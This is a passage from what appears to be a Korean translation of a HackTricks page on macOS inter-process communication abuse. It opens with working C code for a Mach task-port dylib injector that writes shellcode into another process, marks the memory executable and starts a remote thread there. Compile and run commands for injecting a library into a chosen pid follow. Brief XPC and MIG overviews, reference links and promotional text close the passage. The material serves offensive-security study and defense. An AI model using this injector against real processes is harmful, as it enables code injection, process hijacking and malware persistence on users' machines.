uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
```kr
kr = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"원격 스레드의 코드에 대한 메모리 권한을 설정할 수 없습니다: 오류 %s\n", mach_error_string(kr));
return (-4);
}

// 할당된 스택 메모리의 권한 설정
kr = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"원격 스레드의 스택에 대한 메모리 권한을 설정할 수 없습니다: 오류 %s\n", mach_error_string(kr));
return (-4);
}


// 쉘코드를 실행할 스레드 생성
struct arm_unified_thread_state remoteThreadState64;
thread_act_t remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64));

remoteStack64 += (STACK_SIZE / 2); // 실제 스택
//remoteStack64 -= 8;  // 16의 정렬 필요

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("원격 스택 64  0x%llx, 원격 코드는 %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"원격 스레드를 생성할 수 없습니다: 오류 %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "사용법: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: 디스크에 있는 dylib의 경로\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib를 찾을 수 없습니다\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### 작업 포트를 통한 스레드 하이재킹 <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

이 기술에서는 프로세스의 스레드가 하이재킹됩니다:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md" %}
[macos-thread-injection-via-task-port.md](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-thread-injection-via-task-port.md)
{% endcontent-ref %}

## XPC

### 기본 정보

XPC는 macOS 및 iOS에서 프로세스 간 통신을 위한 XNU(맥 운영체제에서 사용되는 커널) 인터프로세스 통신 프레임워크입니다. XPC는 시스템 내에서 서로 다른 프로세스 간에 안전하고 비동기적인 메서드 호출을 수행하기 위한 메커니즘을 제공합니다. 이는 Apple의 보안 패러다임의 일부로, 각 구성 요소가 작업을 수행하기 위해 필요한 권한만 가지고 실행되는 권한 분리 애플리케이션의 생성을 허용하여, 침해된 프로세스로부터의 잠재적인 피해를 제한합니다.

이 **통신이 작동하는 방식**과 **취약할 수 있는 방법**에 대한 자세한 정보는 다음을 참조하십시오:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/" %}
[macos-xpc](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-xpc/)
{% endcontent-ref %}

## MIG - Mach 인터페이스 생성기

MIG는 Mach IPC 코드 생성 과정을 간소화하기 위해 만들어졌습니다. 기본적으로 주어진 정의와 서버 및 클라이언트 간의 통신에 필요한 코드를 생성합니다. 생성된 코드가 어색하더라도, 개발자는 그것을 가져와서 이전보다 훨씬 간단한 코드를 작성할 수 있습니다.

자세한 내용은 다음을 확인하십시오:

{% content-ref url="../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-mig-mach-interface-generator.md" %}
[macos-mig-mach-interface-generator.md](../../macos-proces-abuse/macos-ipc-inter-process-communication/macos-mig-mach-interface-generator.md)
{% endcontent-ref %}

## 참고 자료

* [https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
* [https://knight.sc/malware/2019/03/15/code-injection-on-macos.html](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
* [https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
* [https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요!</summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family)인 [**The PEASS Family**](https://opensea.io/collection/the-peass-family) 컬렉션을 발견하세요.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**를** **팔로우**하세요.
* **HackTricks**와 **HackTricks Cloud** github 저장소에 PR을 제출하여 **자신의 해킹 기법을 공유**하세요.

</details>
